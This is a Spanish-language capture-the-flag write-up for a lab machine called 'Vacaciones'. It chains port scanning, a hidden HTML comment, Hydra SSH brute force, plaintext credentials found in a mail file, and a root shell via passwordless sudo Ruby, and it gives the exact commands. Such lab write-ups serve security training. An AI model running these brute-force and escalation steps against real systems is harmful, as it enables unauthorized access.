# 🧳 Writeup – Máquina **“Vacaciones”**

## 🔎 Reconocimiento Inicial

Escaneamos los puertos de la máquina objetivo:

```bash
sudo nmap -sS -sV 172.17.0.2
📌 Servicios encontrados
Puerto 22 – SSH

Puerto 80 – HTTP

🌐 Enumeración del Servicio Web
encontre la carpeta javascript con gobuster sin nada
Al acceder al sitio web en el puerto 80, interceptamos el tráfico utilizando Burp Suite.

Al cambiar el método HTTP de GET a POST, descubrimos un comentario oculto en el código HTML:

<!-- comentario oculto -->
Este comentario revela la existencia de dos usuarios:

Camilo

Juan

🔐 Ataque de Fuerza Bruta a SSH
Utilizando Hydra, realizamos un ataque de fuerza bruta contra el usuario Camilo en el servicio SSH:

hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
✅ Credenciales obtenidas
Usuario: camilo

Contraseña: contraseña1

Nos conectamos por SSH:

ssh camilo@172.17.0.2
👤 Enumeración del Usuario Camilo
Una vez dentro, verificamos sus privilegios:

sudo -l
El usuario Camilo no posee permisos sudo, pero encontramos una referencia a un correo.

Investigamos el directorio de correos del sistema:

ls -la /var/mail/
cat /var/mail/juan.txt
📬 Contenido del correo
Hola Camilo,

Te dejo mis credenciales por si las necesitas:

Usuario: juan
Contraseña: 2k84dicb

Saludos,
Juan
🔄 Movimiento Lateral a Usuario Juan
Utilizamos las credenciales encontradas para conectarnos como Juan:

ssh juan@172.17.0.2
🚀 Escalada Final a Root
Verificamos los privilegios sudo del usuario Juan:

sudo -l
El resultado muestra:

El usuario juan puede ejecutar los siguientes comandos en c8c04d750b1b:
(ALL) NOPASSWD: /usr/bin/ruby
👉 Juan puede ejecutar Ruby como root sin contraseña.

Ejecutamos el siguiente comando para obtener una shell como root:

sudo ruby -e 'exec "/bin/bash"'
Verificamos acceso root:

whoami
root
🗂️ Resumen de Credenciales
Camilo: contraseña1

Juan: 2k84dicb

Root: obtenido mediante escalada de privilegios

🧠 Conclusión
La máquina “Vacaciones” presenta múltiples vulnerabilidades encadenables:

Información sensible expuesta en comentarios HTML

Contraseña débil del usuario Camilo vulnerable a fuerza bruta

Credenciales almacenadas en texto plano en /var/mail/

Configuración insegura de sudo permitiendo ejecutar Ruby como root sin contraseña

🔗 Ruta de explotación
Información oculta → Fuerza bruta → Movimiento lateral → Escalada de privilegios

✅ Máquina completada exitosamente.


---
